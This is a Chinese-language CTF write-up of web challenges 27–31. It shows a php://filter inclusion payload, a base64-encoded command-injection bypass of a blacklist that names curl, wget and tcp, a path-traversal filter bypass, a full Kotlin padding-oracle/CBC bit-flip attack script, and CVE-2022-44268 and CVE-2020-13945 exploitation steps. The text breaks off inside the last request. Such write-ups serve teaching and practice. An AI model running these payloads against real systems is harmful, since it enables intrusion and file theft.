<h3 id="web-27-想获取flag吗" class="mt-10 mb-2 leading-7 text-xl title_3b154"><a class="link_3b154 header-anchor" aria-hidden="true" href="#web-27-想获取flag吗">#</a>web-27 想获取flag吗</h3>
<p class="my-4 leading-7">提示给出来说要先获取源码，查看提示可以尝试包含ma.php。在index.php试了几个参数，发现file=可以包含。获取index.php和ma.php的源码。</p>
<div class="language-text"><div class="rspress-code-content rspress-scrollbar"><div><pre class="code" style="background-color:inherit"><code class="language-text" style="white-space:pre"><span style="display:block;padding:0 1.25rem"><span>/?file=php://filter/convert.base64-encode/resource=ma.php
</span></span><span style="display:block;padding:0 1.25rem">/?file=php://filter/convert.base64-encode/resource=index.php</span></code></pre></div><div class="code-button-group_15153"><button><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24" class="icon-wrapped_15153"><path fill="#22a041" d="M21 5H3v2h18zM3 19h7v-2H3zm0-6h15c1 0 2 .43 2 2s-1 2-2 2h-2v-2l-4 3 4 3v-2h2c2.95 0 4-1.27 4-4 0-2.72-1-4-4-4H3z"></path></svg><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24" class="icon-wrap_15153"><path fill="currentColor" d="M16 7H3V5h13v2M3 19h13v-2H3v2m19-7-4-3v2H3v2h15v2l4-3Z"></path></svg></button><button class="code-copy-button_15153"><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 30 30" class="icon-copy_15153"><path fill="currentColor" d="M28 10v18H10V10h18m0-2H10a2 2 0 0 0-2 2v18a2 2 0 0 0 2 2h18a2 2 0 0 0 2-2V10a2 2 0 0 0-2-2Z"></path><path fill="currentColor" d="M4 18H2V4a2 2 0 0 1 2-2h14v2H4Z"></path></svg><svg width="32" height="32" viewBox="0 0 30 30" class="icon-success_15153"><path fill="#49cd37" d="m13 24-9-9 1.414-1.414L13 21.171 26.586 7.586 28 9 13 24z"></path></svg></button></div></div></div>
<p class="my-4 leading-7">这里重点看一下ma.php的源码，是一个绕过</p>
<div class="language-php"><div class="rspress-code-content rspress-scrollbar"><div><pre class="code" style="background-color:inherit"><code class="language-php" style="white-space:pre"><span style="display:block;padding:0 1.25rem"><span>&lt;?php
</span></span><span style="display:block;padding:0 1.25rem">error_reporting(0);
</span><span style="display:block;padding:0 1.25rem">function blacklist($cmd){
</span><span style="display:block;padding:0 1.25rem">  $filter = &quot;(\\&lt;|\\&gt;|php|curl| |0x|\\\\|python|gcc|less|root|etc|pass|http|ftp|cd|tcp|udp|cat|×|flag|ph|hp|wget|type|ty|\\$\\{IFS\\}|index|\\*)&quot;;
</span><span style="display:block;padding:0 1.25rem">  if (preg_match(&quot;/&quot;.$filter.&quot;/is&quot;,$cmd)==1){  
</span><span style="display:block;padding:0 1.25rem">      exit(&#x27;Go out! This black page does not belong to you!&#x27;);
</span><span style="display:block;padding:0 1.25rem">  }
</span><span style="display:block;padding:0 1.25rem">  else{
</span><span style="display:block;padding:0 1.25rem">    system($cmd);
</span><span style="display:block;padding:0 1.25rem">  }
</span><span style="display:block;padding:0 1.25rem">}
</span><span style="display:block;padding:0 1.25rem">blacklist($_GET[&#x27;cmd&#x27;]);
</span><span style="display:block;padding:0 1.25rem">?&gt;</span></code></pre></div><div class="code-button-group_15153"><button><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24" class="icon-wrapped_15153"><path fill="#22a041" d="M21 5H3v2h18zM3 19h7v-2H3zm0-6h15c1 0 2 .43 2 2s-1 2-2 2h-2v-2l-4 3 4 3v-2h2c2.95 0 4-1.27 4-4 0-2.72-1-4-4-4H3z"></path></svg><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24" class="icon-wrap_15153"><path fill="currentColor" d="M16 7H3V5h13v2M3 19h13v-2H3v2m19-7-4-3v2H3v2h15v2l4-3Z"></path></svg></button><button class="code-copy-button_15153"><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 30 30" class="icon-copy_15153"><path fill="currentColor" d="M28 10v18H10V10h18m0-2H10a2 2 0 0 0-2 2v18a2 2 0 0 0 2 2h18a2 2 0 0 0 2-2V10a2 2 0 0 0-2-2Z"></path><path fill="currentColor" d="M4 18H2V4a2 2 0 0 1 2-2h14v2H4Z"></path></svg><svg width="32" height="32" viewBox="0 0 30 30" class="icon-success_15153"><path fill="#49cd37" d="m13 24-9-9 1.414-1.414L13 21.171 26.586 7.586 28 9 13 24z"></path></svg></button></div></div></div>
<p class="my-4 leading-7">看样子禁用了空格，一些基本的查看命令，尝试了几种方法，最后用base64编码+空格绕过的方式获取到的flag。</p>
<div class="language-text"><div class="rspress-code-content rspress-scrollbar"><div><pre class="code" style="background-color:inherit"><code class="language-text" style="white-space:pre"><span style="display:block;padding:0 1.25rem"><span>/ma.php/?cmd=echo$IFS$9Y2F0IC9mbGFnLnR4dA==|base64$IFS$9-d|bash</span></span></code></pre></div><div class="code-button-group_15153"><button><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24" class="icon-wrapped_15153"><path fill="#22a041" d="M21 5H3v2h18zM3 19h7v-2H3zm0-6h15c1 0 2 .43 2 2s-1 2-2 2h-2v-2l-4 3 4 3v-2h2c2.95 0 4-1.27 4-4 0-2.72-1-4-4-4H3z"></path></svg><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24" class="icon-wrap_15153"><path fill="currentColor" d="M16 7H3V5h13v2M3 19h13v-2H3v2m19-7-4-3v2H3v2h15v2l4-3Z"></path></svg></button><button class="code-copy-button_15153"><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 30 30" class="icon-copy_15153"><path fill="currentColor" d="M28 10v18H10V10h18m0-2H10a2 2 0 0 0-2 2v18a2 2 0 0 0 2 2h18a2 2 0 0 0 2-2V10a2 2 0 0 0-2-2Z"></path><path fill="currentColor" d="M4 18H2V4a2 2 0 0 1 2-2h14v2H4Z"></path></svg><svg width="32" height="32" viewBox="0 0 30 30" class="icon-success_15153"><path fill="#49cd37" d="m13 24-9-9 1.414-1.414L13 21.171 26.586 7.586 28 9 13 24z"></path></svg></button></div></div></div>
<p class="my-4 leading-7">空格使用 <code>$IFS$9</code> 绕过，命令编码base64，内容是 <code>cat /flag.txt</code>。</p>
<h3 id="web-28-神奇的魔方" class="mt-10 mb-2 leading-7 text-xl title_3b154"><a class="link_3b154 header-anchor" aria-hidden="true" href="#web-28-神奇的魔方">#</a>web-28 神奇的魔方</h3>
<p class="my-4 leading-7">开始给了个页面，是个魔方游戏。开始找页面源码的内容。</p>
<p class="my-4 leading-7"><img alt="源码" src="/static/image/web-28-1.ce296512.png"/></p>
<p class="my-4 leading-7">这段奇怪的混淆最终证明确实是控制台输出的那些文本。。。</p>
<p class="my-4 leading-7">然后看到了请求头里返回的服务器名称<code>openresty/1.21.4.1</code>有什么漏洞可以用，找了一下也没有。。。</p>
<p class="my-4 leading-7">注意到网站会把不存在的资源返回index.gk的内容，试了一个static和uploads里常用的路径（例如/static/index.css），发现不太行。（事后发现，直接访问/uploads路径就出来了）。。。考虑到一个一个猜比较麻烦，就上路径扫描了。</p>
<div class="language-text"><div class="rspress-code-content rspress-scrollbar"><div><pre class="code" style="background-color:inherit"><code class="language-text" style="white-space:pre"><span style="display:block;padding:0 1.25rem"><span># sumy @ SumyDeMBP in ~/PycharmProjects/dirmap on git:master
</span></span><span style="display:block;padding:0 1.25rem">$ python3 dirmap.py -i http://10.167.181.96/ -lcf
</span><span style="display:block;padding:0 1.25rem">
</span><span style="display:block;padding:0 1.25rem">                     #####  # #####  #    #   ##   #####
</span><span style="display:block;padding:0 1.25rem">                     #    # # #    # ##  ##  #  #  #    #
</span><span style="display:block;padding:0 1.25rem">                     #    # # #    # # ## # #    # #    #
</span><span style="display:block;padding:0 1.25rem">                     #    # # #####  #    # ###### #####
</span><span style="display:block;padding:0 1.25rem">                     #    # # #   #  #    # #    # #
</span><span style="display:block;padding:0 1.25rem">                     #####  # #    # #    # #    # #   v1.0
</span><span style="display:block;padding:0 1.25rem">
</span><span style="display:block;padding:0 1.25rem">[*] Initialize targets...
</span><span style="display:block;padding:0 1.25rem">[+] Load targets from: http://10.167.181.96/
</span><span style="display:block;padding:0 1.25rem">[+] Set the number of thread: 30
</span><span style="display:block;padding:0 1.25rem">[+] Coroutine mode
</span><span style="display:block;padding:0 1.25rem">[+] Current target: http://10.167.181.96/
</span><span style="display:block;padding:0 1.25rem">[*] Launching auto check 404
</span><span style="display:block;padding:0 1.25rem">[+] Checking with: http://10.167.181.96/avrescwitssamcofbyccnslxyowtryrdinlrmdyuaq
</span><span style="display:block;padding:0 1.25rem">[*] Use recursive scan: No
</span><span style="display:block;padding:0 1.25rem">[*] Use dict mode
</span><span style="display:block;padding:0 1.25rem">[+] Load dict:/Users/sumy/PycharmProjects/dirmap/data/dict_mode_dict.txt
</span><span style="display:block;padding:0 1.25rem">[*] Use crawl mode
</span><span style="display:block;padding:0 1.25rem">[200][application/octet-stream][6.00kb] http://10.167.181.96/.DS_Store
</span><span style="display:block;padding:0 1.25rem">[200][application/octet-stream][0b] http://10.167.181.96/common
</span><span style="display:block;padding:0 1.25rem">[200][application/json; charset=utf-8][43.00b] http://10.167.181.96/download
</span><span style="display:block;padding:0 1.25rem">[200][text/html][1.07kb] http://10.167.181.96/index.html
</span><span style="display:block;padding:0 1.25rem">[200][text/html][2.17kb] http://10.167.181.96/templates/
</span><span style="display:block;padding:0 1.25rem">[200][text/html][334.00b] http://10.167.181.96/uploads/
</span><span style="display:block;padding:0 1.25rem">100% (5715 of 5715) |##############################################| Elapsed Time: 0:02:44 Time:  0:02:44
</span><span style="display:block;padding:0 1.25rem">(base)</span></code></pre></div><div class="code-button-group_15153"><button><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24" class="icon-wrapped_15153"><path fill="#22a041" d="M21 5H3v2h18zM3 19h7v-2H3zm0-6h15c1 0 2 .43 2 2s-1 2-2 2h-2v-2l-4 3 4 3v-2h2c2.95 0 4-1.27 4-4 0-2.72-1-4-4-4H3z"></path></svg><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24" class="icon-wrap_15153"><path fill="currentColor" d="M16 7H3V5h13v2M3 19h13v-2H3v2m19-7-4-3v2H3v2h15v2l4-3Z"></path></svg></button><button class="code-copy-button_15153"><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 30 30" class="icon-copy_15153"><path fill="currentColor" d="M28 10v18H10V10h18m0-2H10a2 2 0 0 0-2 2v18a2 2 0 0 0 2 2h18a2 2 0 0 0 2-2V10a2 2 0 0 0-2-2Z"></path><path fill="currentColor" d="M4 18H2V4a2 2 0 0 1 2-2h14v2H4Z"></path></svg><svg width="32" height="32" viewBox="0 0 30 30" class="icon-success_15153"><path fill="#49cd37" d="m13 24-9-9 1.414-1.414L13 21.171 26.586 7.586 28 9 13 24z"></path></svg></button></div></div></div>
<p class="my-4 leading-7">发现有个下载路径/download指定file可以下载文件。尝试下载/download?file=/flag/flag.txt，感觉没那么容易。会删除<code>ag/</code>和<code>../</code>这两个字符串。</p>
<p class="my-4 leading-7">这好说，构造一下就行了：</p>
<ul class="list-disc pl-5 my-4 leading-7">
<li class="[&amp;:not(:first-child)]:mt-2"><code>..././</code> 代替 <code>../</code></li>
<li class="[&amp;:not(:first-child)]:mt-2"><code>agag//</code> 代替 <code>ag/</code></li>
</ul>
<p class="my-4 leading-7">最终获取flag。</p>
<p class="my-4 leading-7"><img alt="请求结果" src="/static/image/web-28-2.4c739fcc.png"/></p>
<h3 id="web-29-拿到管理员权限就能得到flag啦" class="mt-10 mb-2 leading-7 text-xl title_3b154"><a class="link_3b154 header-anchor" aria-hidden="true" href="#web-29-拿到管理员权限就能得到flag啦">#</a>web-29 拿到管理员权限就能得到flag啦！</h3>
<p class="my-4 leading-7">上来就能看到源码，是一个代码审计题目。直接拿代码的关键词谷歌，发现是CBC翻转字节攻击的方法。找到一篇博客里面有POC。<a target="_blank" rel="noopener noreferrer" href="https://chybeta.github.io/2017/11/18/LCTF-2017-Simple-blog-writeup/" class="link-_707cf  link_3b154 inline-link_3b154">https://chybeta.github.io/2017/11/18/LCTF-2017-Simple-blog-writeup/</a></p>
<p class="my-4 leading-7">参考里面的代码，实现了一版Java版本的，开始爆破，几分钟救出来了。。。（调代码调了几个小时。。。</p>
<div class="language-kotlin"><div class="rspress-code-content rspress-scrollbar"><div><pre class="code" style="background-color:inherit"><code class="language-kotlin" style="white-space:pre"><span style="display:block;padding:0 1.25rem"><span>package com.sumygg.mictf2023.web_29
</span></span><span style="display:block;padding:0 1.25rem">
</span><span style="display:block;padding:0 1.25rem">import okhttp3.MediaType.Companion.toMediaType
</span><span style="display:block;padding:0 1.25rem">import okhttp3.OkHttpClient
</span><span style="display:block;padding:0 1.25rem">import okhttp3.Request
</span><span style="display:block;padding:0 1.25rem">import okhttp3.RequestBody.Companion.toRequestBody
</span><span style="display:block;padding:0 1.25rem">import org.apache.commons.codec.binary.Base64
</span><span style="display:block;padding:0 1.25rem">
</span><span style="display:block;padding:0 1.25rem">
</span><span style="display:block;padding:0 1.25rem">val url = &quot;https://decrypt-ctfd.dun.mi.com/index.php?run=1&quot;
</span><span style="display:block;padding:0 1.25rem">val N = 16
</span><span style="display:block;padding:0 1.25rem">var client = OkHttpClient()
</span><span style="display:block;padding:0 1.25rem">val casCookie = &quot;MIDUN_COOKIE&quot;
</span><span style="display:block;padding:0 1.25rem">
</span><span style="display:block;padding:0 1.25rem">fun injectToken(token: String): String {
</span><span style="display:block;padding:0 1.25rem">    val body = &quot;{}&quot;.toRequestBody(&quot;application/json&quot;.toMediaType())
</span><span style="display:block;padding:0 1.25rem">    val request = Request.Builder()
</span><span style="display:block;padding:0 1.25rem">        .url(url)
</span><span style="display:block;padding:0 1.25rem">        .header(&quot;Cookie&quot;, &quot;${casCookie}PHPSESSID=$phpsession;token=$token&quot;)
</span><span style="display:block;padding:0 1.25rem">        .post(body)
</span><span style="display:block;padding:0 1.25rem">        .build()
</span><span style="display:block;padding:0 1.25rem">    val response = client.newCall(request).execute()
</span><span style="display:block;padding:0 1.25rem">    val str = response.body?.string() ?: &quot;Err!empty body&quot;
</span><span style="display:block;padding:0 1.25rem">//    println(str)
</span><span style="display:block;padding:0 1.25rem">    return str
</span><span style="display:block;padding:0 1.25rem">}
</span><span style="display:block;padding:0 1.25rem">
</span><span style="display:block;padding:0 1.25rem">fun xor(a: String, b: String): String {
</span><span style="display:block;padding:0 1.25rem">    return a.indices.map { (a[it].code xor b[it % b.length].code).toChar() }.joinToString(&quot;&quot;)
</span><span style="display:block;padding:0 1.25rem">}
</span><span style="display:block;padding:0 1.25rem">
</span><span style="display:block;padding:0 1.25rem">fun pad(str: String, n: Int): String {
</span><span style="display:block;padding:0 1.25rem">    val l = str.length
</span><span style="display:block;padding:0 1.25rem">    if (l != n) {
</span><span style="display:block;padding:0 1.25rem">        return str + ((n - l).toChar().toString().repeat(n - l))
</span><span style="display:block;padding:0 1.25rem">
</span><span style="display:block;padding:0 1.25rem">    }
</span><span style="display:block;padding:0 1.25rem">    return str
</span><span style="display:block;padding:0 1.25rem">}
</span><span style="display:block;padding:0 1.25rem">
</span><span style="display:block;padding:0 1.25rem">fun paddingOracle(n: Int): String {
</span><span style="display:block;padding:0 1.25rem">    var get = &quot;&quot;
</span><span style="display:block;padding:0 1.25rem">    for (i in 1 until n + 1) {
</span><span style="display:block;padding:0 1.25rem">        for (j in 0 until 256) {
</span><span style="display:block;padding:0 1.25rem">            val padding = xor(get, i.toChar().toString().repeat(i - 1))
</span><span style="display:block;padding:0 1.25rem">            val c = Char(0).toString().repeat(16 - i) + j.toChar() + padding
</span><span style="display:block;padding:0 1.25rem">            val result = injectToken(String(Base64.encodeBase64(c.toByteArray())))
</span><span style="display:block;padding:0 1.25rem">            if (&quot;Err!&quot; !in result) {
</span><span style="display:block;padding:0 1.25rem">                get = (j xor i).toChar() + get
</span><span style="display:block;padding:0 1.25rem">                break
</span><span style="display:block;padding:0 1.25rem">            }
</span><span style="display:block;padding:0 1.25rem">        }
</span><span style="display:block;padding:0 1.25rem">    }
</span><span style="display:block;padding:0 1.25rem">    return get
</span><span style="display:block;padding:0 1.25rem">}
</span><span style="display:block;padding:0 1.25rem">
</span><span style="display:block;padding:0 1.25rem">var phpsession = &quot;399476c1af05f00d22d4e318db0ef2a7&quot;
</span><span style="display:block;padding:0 1.25rem">var originToken = &quot;eXlQSmJmdXc2NzI0SmpodQ==&quot;
</span><span style="display:block;padding:0 1.25rem">var token = String(Base64.decodeBase64(originToken))
</span><span style="display:block;padding:0 1.25rem">
</span><span style="display:block;padding:0 1.25rem">fun getSessionAndToken() {
</span><span style="display:block;padding:0 1.25rem">    val body = &quot;{}&quot;.toRequestBody(&quot;application/json&quot;.toMediaType())
</span><span style="display:block;padding:0 1.25rem">    val request = Request.Builder()
</span><span style="display:block;padding:0 1.25rem">        .url(url)
</span><span style="display:block;padding:0 1.25rem">        .header(&quot;Cookie&quot;, &quot;${casCookie}foo=bar&quot;)
</span><span style="display:block;padding:0 1.25rem">        .post(body)
</span><span style="display:block;padding:0 1.25rem">        .build()
</span><span style="display:block;padding:0 1.25rem">    val response = client.newCall(request).execute()
</span><span style="display:block;padding:0 1.25rem">    val responseCookie = response.headers(&quot;Set-Cookie&quot;)
</span><span style="display:block;padding:0 1.25rem">    val cookies = HashMap&lt;String, String&gt;()
</span><span style="display:block;padding:0 1.25rem">    for (setCookie in responseCookie) {
</span><span style="display:block;padding:0 1.25rem">        println(setCookie)
</span><span style="display:block;padding:0 1.25rem">        val match = &quot;([^=]+)=([^\\;]+);?.*&quot;.toPattern().matcher(setCookie)
</span><span style="display:block;padding:0 1.25rem">        if (match.matches()) {
</span><span style="display:block;padding:0 1.25rem">            cookies[match.group(1)] = match.group(2)
</span><span style="display:block;padding:0 1.25rem">        }
</span><span style="display:block;padding:0 1.25rem">    }
</span><span style="display:block;padding:0 1.25rem">    phpsession = &quot;${cookies[&quot;PHPSESSID&quot;]}&quot;
</span><span style="display:block;padding:0 1.25rem">    originToken = &quot;${cookies[&quot;token&quot;]}&quot;.replace(&quot;%3D&quot;, &quot;=&quot;)
</span><span style="display:block;padding:0 1.25rem">    token = String(Base64.decodeBase64(originToken))
</span><span style="display:block;padding:0 1.25rem">}
</span><span style="display:block;padding:0 1.25rem">
</span><span style="display:block;padding:0 1.25rem">fun main() {
</span><span style="display:block;padding:0 1.25rem">    while (true) {
</span><span style="display:block;padding:0 1.25rem">//        getSessionAndToken()
</span><span style="display:block;padding:0 1.25rem">        println(phpsession)
</span><span style="display:block;padding:0 1.25rem">        println(originToken)
</span><span style="display:block;padding:0 1.25rem">        val middle1 = paddingOracle(N)
</span><span style="display:block;padding:0 1.25rem">        println(middle1)
</span><span style="display:block;padding:0 1.25rem">        println(middle1.length)
</span><span style="display:block;padding:0 1.25rem">        if (middle1.length + 1 == 16) {
</span><span style="display:block;padding:0 1.25rem">            for (i in 0 until 256) {
</span><span style="display:block;padding:0 1.25rem">                val middle = i.toChar() + middle1
</span><span style="display:block;padding:0 1.25rem">                println(&quot;token:${token}&quot;)
</span><span style="display:block;padding:0 1.25rem">                println(&quot;middle:${middle}&quot;)
</span><span style="display:block;padding:0 1.25rem">                val plaintext = xor(middle, token)
</span><span style="display:block;padding:0 1.25rem">                println(&quot;plaintext:${plaintext}&quot;)
</span><span style="display:block;padding:0 1.25rem">                val des = pad(&quot;admin&quot;, N)
</span><span style="display:block;padding:0 1.25rem">                var tmp = &quot;&quot;
</span><span style="display:block;padding:0 1.25rem">                for (j in 0 until 16) {
</span><span style="display:block;padding:0 1.25rem">                    tmp += (token[j].code xor plaintext[j].code xor des[j].code).toChar()
</span><span style="display:block;padding:0 1.25rem">                }
</span><span style="display:block;padding:0 1.25rem">                val encodeTmp = String(Base64.encodeBase64(tmp.toByteArray()))
</span><span style="display:block;padding:0 1.25rem">                println(&quot;tmp:${encodeTmp}&quot;)
</span><span style="display:block;padding:0 1.25rem">                val result = injectToken(encodeTmp)
</span><span style="display:block;padding:0 1.25rem">                println(result)
</span><span style="display:block;padding:0 1.25rem">                println()
</span><span style="display:block;padding:0 1.25rem">            }
</span><span style="display:block;padding:0 1.25rem">        }
</span><span style="display:block;padding:0 1.25rem">    }
</span><span style="display:block;padding:0 1.25rem">}</span></code></pre></div><div class="code-button-group_15153"><button><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24" class="icon-wrapped_15153"><path fill="#22a041" d="M21 5H3v2h18zM3 19h7v-2H3zm0-6h15c1 0 2 .43 2 2s-1 2-2 2h-2v-2l-4 3 4 3v-2h2c2.95 0 4-1.27 4-4 0-2.72-1-4-4-4H3z"></path></svg><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24" class="icon-wrap_15153"><path fill="currentColor" d="M16 7H3V5h13v2M3 19h13v-2H3v2m19-7-4-3v2H3v2h15v2l4-3Z"></path></svg></button><button class="code-copy-button_15153"><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 30 30" class="icon-copy_15153"><path fill="currentColor" d="M28 10v18H10V10h18m0-2H10a2 2 0 0 0-2 2v18a2 2 0 0 0 2 2h18a2 2 0 0 0 2-2V10a2 2 0 0 0-2-2Z"></path><path fill="currentColor" d="M4 18H2V4a2 2 0 0 1 2-2h14v2H4Z"></path></svg><svg width="32" height="32" viewBox="0 0 30 30" class="icon-success_15153"><path fill="#49cd37" d="m13 24-9-9 1.414-1.414L13 21.171 26.586 7.586 28 9 13 24z"></path></svg></button></div></div></div>
<p class="my-4 leading-7"><img alt="result" src="/static/image/web-29-1.109c3db3.png"/></p>
<h3 id="web-30-魔法再现" class="mt-10 mb-2 leading-7 text-xl title_3b154"><a class="link_3b154 header-anchor" aria-hidden="true" href="#web-30-魔法再现">#</a>web-30 魔法再现</h3>
<p class="my-4 leading-7">去年有两个这样的题目，今年又来了一个。猜测是ImageMagick相关的漏洞。</p>
<p class="my-4 leading-7">先看现象，上传一个图片文件（限定了几种格式），会转成png文件，然后图片宽高被调整到50x50。页面中也出现了flag{******}字样，目标明确了，就是想办法读取index.php文件里的flag。</p>
<p class="my-4 leading-7">然后开始找imagemagick的相关漏洞</p>
<p class="my-4 leading-7">================找了好几天的分割线=================</p>
<p class="my-4 leading-7">偶然间发现了2022年新的漏洞CVE-2022-44268远程文件泄露漏洞。具体漏洞内容就不详述了。下面说利用过程。</p>
<ol class="list-decimal pl-5 my-4 leading-7">
<li class="[&amp;:not(:first-child)]:mt-2">首先准备一个空白的png用于上传。</li>
</ol>
<div class="language-text"><div class="rspress-code-content rspress-scrollbar"><div><pre class="code" style="background-color:inherit"><code class="language-text" style="white-space:pre"><span style="display:block;padding:0 1.25rem"><span>89504E47 0D0A1A0A 0000000D 49484452 00000001 00000001 01000000 00376EF9 24000000 0A494441 54789C63 68000000 82008177 CD72B600 00000049 454E44AE 426082</span></span></code></pre></div><div class="code-button-group_15153"><button><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24" class="icon-wrapped_15153"><path fill="#22a041" d="M21 5H3v2h18zM3 19h7v-2H3zm0-6h15c1 0 2 .43 2 2s-1 2-2 2h-2v-2l-4 3 4 3v-2h2c2.95 0 4-1.27 4-4 0-2.72-1-4-4-4H3z"></path></svg><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24" class="icon-wrap_15153"><path fill="currentColor" d="M16 7H3V5h13v2M3 19h13v-2H3v2m19-7-4-3v2H3v2h15v2l4-3Z"></path></svg></button><button class="code-copy-button_15153"><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 30 30" class="icon-copy_15153"><path fill="currentColor" d="M28 10v18H10V10h18m0-2H10a2 2 0 0 0-2 2v18a2 2 0 0 0 2 2h18a2 2 0 0 0 2-2V10a2 2 0 0 0-2-2Z"></path><path fill="currentColor" d="M4 18H2V4a2 2 0 0 1 2-2h14v2H4Z"></path></svg><svg width="32" height="32" viewBox="0 0 30 30" class="icon-success_15153"><path fill="#49cd37" d="m13 24-9-9 1.414-1.414L13 21.171 26.586 7.586 28 9 13 24z"></path></svg></button></div></div></div>
<ol start="2" class="list-decimal pl-5 my-4 leading-7">
<li class="[&amp;:not(:first-child)]:mt-2">给png的exif写入profile和文件路径，用于触发文件读取。</li>
</ol>
<div class="language-shell"><div class="rspress-code-content rspress-scrollbar"><div><pre class="code" style="background-color:inherit"><code class="language-shell" style="white-space:pre"><span style="display:block;padding:0 1.25rem"><span>brew </span><span class="token" style="color:var(--code-token-function)">install</span><span> pngcrush
</span></span><span style="display:block;padding:0 1.25rem"><span>pngcrush -text a </span><span class="token" style="color:var(--code-token-string)">&quot;profile&quot;</span><span> </span><span class="token" style="color:var(--code-token-string)">&quot;index.php&quot;</span><span> pngin.png</span></span></code></pre></div><div class="code-button-group_15153"><button><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24" class="icon-wrapped_15153"><path fill="#22a041" d="M21 5H3v2h18zM3 19h7v-2H3zm0-6h15c1 0 2 .43 2 2s-1 2-2 2h-2v-2l-4 3 4 3v-2h2c2.95 0 4-1.27 4-4 0-2.72-1-4-4-4H3z"></path></svg><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24" class="icon-wrap_15153"><path fill="currentColor" d="M16 7H3V5h13v2M3 19h13v-2H3v2m19-7-4-3v2H3v2h15v2l4-3Z"></path></svg></button><button class="code-copy-button_15153"><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 30 30" class="icon-copy_15153"><path fill="currentColor" d="M28 10v18H10V10h18m0-2H10a2 2 0 0 0-2 2v18a2 2 0 0 0 2 2h18a2 2 0 0 0 2-2V10a2 2 0 0 0-2-2Z"></path><path fill="currentColor" d="M4 18H2V4a2 2 0 0 1 2-2h14v2H4Z"></path></svg><svg width="32" height="32" viewBox="0 0 30 30" class="icon-success_15153"><path fill="#49cd37" d="m13 24-9-9 1.414-1.414L13 21.171 26.586 7.586 28 9 13 24z"></path></svg></button></div></div></div>
<p class="my-4 leading-7">profile是exif的属性名，index.php是读取的文件名。
3. 将文件上传到网站，把处理后的文件下载下来。
4. 解析处理后文件的数据</p>
<div class="language-shell"><div class="rspress-code-content rspress-scrollbar"><div><pre class="code" style="background-color:inherit"><code class="language-shell" style="white-space:pre"><span style="display:block;padding:0 1.25rem"><span>brew </span><span class="token" style="color:var(--code-token-function)">install</span><span> exif
</span></span><span style="display:block;padding:0 1.25rem">exiftool 645f4aeaa8285.png -b</span></code></pre></div><div class="code-button-group_15153"><button><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24" class="icon-wrapped_15153"><path fill="#22a041" d="M21 5H3v2h18zM3 19h7v-2H3zm0-6h15c1 0 2 .43 2 2s-1 2-2 2h-2v-2l-4 3 4 3v-2h2c2.95 0 4-1.27 4-4 0-2.72-1-4-4-4H3z"></path></svg><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24" class="icon-wrap_15153"><path fill="currentColor" d="M16 7H3V5h13v2M3 19h13v-2H3v2m19-7-4-3v2H3v2h15v2l4-3Z"></path></svg></button><button class="code-copy-button_15153"><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 30 30" class="icon-copy_15153"><path fill="currentColor" d="M28 10v18H10V10h18m0-2H10a2 2 0 0 0-2 2v18a2 2 0 0 0 2 2h18a2 2 0 0 0 2-2V10a2 2 0 0 0-2-2Z"></path><path fill="currentColor" d="M4 18H2V4a2 2 0 0 1 2-2h14v2H4Z"></path></svg><svg width="32" height="32" viewBox="0 0 30 30" class="icon-success_15153"><path fill="#49cd37" d="m13 24-9-9 1.414-1.414L13 21.171 26.586 7.586 28 9 13 24z"></path></svg></button></div></div></div>
<p class="my-4 leading-7"><img alt="exif-tool" src="/static/image/web-30-1.2ab983e6.png"/>
5. 把这段代码用hex解码，获取文件内容，从中可以找到flag。（注意开头的862是无用的，不要跟后面的在一起解码。）
<img alt="result" src="/static/image/web-30-2.5211d04f.png"/></p>
<h3 id="web-31-密钥密钥不能默认" class="mt-10 mb-2 leading-7 text-xl title_3b154"><a class="link_3b154 header-anchor" aria-hidden="true" href="#web-31-密钥密钥不能默认">#</a>web-31 密钥，密钥，不能默认</h3>
<p class="my-4 leading-7">观察端口9080和返回的header-server数据，判断是 Apache APISIX，通过搜索发现有个默认密钥漏洞 CVE-2020-13945。构造请求，添加任意命令执行的路由。</p>
<div class="language-http"><div class="rspress-code-content rspress-scrollbar"><div><pre class="code" style="background-color:inherit"><code class="language-http" style="white-space:pre"><span style="display:block;padding:0 1.25rem"><span>POST /apisix/admin/routes HTTP/1.1
</span></span><span style="display:block;padding:0 1.25rem">Host: 10.167.32.15:9080
</span><span style="display:block;padding:0 1.25rem">Upgrade-Insecure-Requests: 1
</span><span style="display:block;padding:0 1.25rem">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.5615.138 Safari/537.36
</span><span style="display:block;padding:0 1.25rem">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
</span><span style="display:block;padding:0 1.25rem">Accept-Encoding: gzip, deflate
</span><span style="display:block;padding:0 1.25rem">Accept-Language: zh-CN,zh;q=0.9
